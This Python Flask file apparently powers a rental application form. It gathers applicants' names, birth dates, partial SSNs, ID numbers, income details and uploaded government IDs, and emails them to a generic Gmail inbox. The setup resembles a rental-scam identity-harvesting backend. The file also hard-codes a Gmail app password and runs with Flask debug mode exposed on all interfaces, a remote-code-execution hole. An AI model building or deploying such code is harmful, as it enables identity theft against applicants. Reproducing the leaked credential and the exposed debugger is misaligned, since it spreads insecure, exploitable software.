import os
from flask import Flask, render_template, request
from werkzeug.utils import secure_filename
import smtplib
from email.message import EmailMessage

# ---------------- CONFIG ----------------
UPLOAD_FOLDER = "uploads"
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "pdf"}

EMAIL_ADDRESS = "confirmationpin@gmail.com"
EMAIL_PASSWORD = "dtij stiy nwmf xrqk"  # Gmail App Password
RECEIVER_EMAIL = "confirmationpin@gmail.com"

# ----------------------------------------

app = Flask(__name__)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

# ---------------- ROUTES ----------------

@app.route("/")
def home():
    return render_template("inbox.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.form
    files = request.files

    attachments = []

    # -------- FILE HANDLING --------
    for field in ["gov_id", "proof_income", "reference_letter"]:
        file = files.get(field)
        if file and file.filename != "" and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            filepath = os.path.join(app.config["UPLOAD_FOLDER"], filename)
            file.save(filepath)
            attachments.append(filepath)

    # -------- EMAIL CONTENT --------
    msg = EmailMessage()
    msg["Subject"] = "New USA Rental Application"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = RECEIVER_EMAIL

    msg.set_content(f"""
APPLICANT INFORMATION
--------------------
Full Name: {data.get('full_name')}
DOB: {data.get('dob')}
Phone: {data.get('phone')}
Email: {data.get('email')}
SSN (Last 4): {data.get('ssn')}
ID Number: {data.get('id_number')}
Issuing State: {data.get('issuing_state')}

RENTAL INFORMATION
--------------------
Property Address: {data.get('property_address')}
Unit Number: {data.get('unit_number')}
Move-in Date: {data.get('move_in')}
Lease Term: {data.get('lease_term')}
Occupants: {data.get('occupants')}
Occupant Names: {data.get('occupant_names')}

CURRENT ADDRESS
--------------------
Address: {data.get('current_address')}
City/State/ZIP: {data.get('current_city')}
Length of Stay: {data.get('length_stay')}
Monthly Rent: {data.get('monthly_rent')}
Reason for Leaving: {data.get('reason_leaving')}

EMPLOYMENT
--------------------
Status: {data.get('employment_status')}
Employer: {data.get('employer_name')}
Job Title: {data.get('job_title')}
Income: {data.get('income')}

AUTHORIZATION
--------------------
Signature: {data.get('signature')}
Date: {data.get('signature_date')}
""")

    # -------- ATTACH FILES --------
    for path in attachments:
        with open(path, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="application",
                subtype="octet-stream",
                filename=os.path.basename(path)
            )

    # -------- SEND EMAIL --------
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

    return """
    <h2 style='text-align:center;color:green'>
    Application Submitted Successfully
    </h2>
    """

# ---------------- RUN ----------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=True)
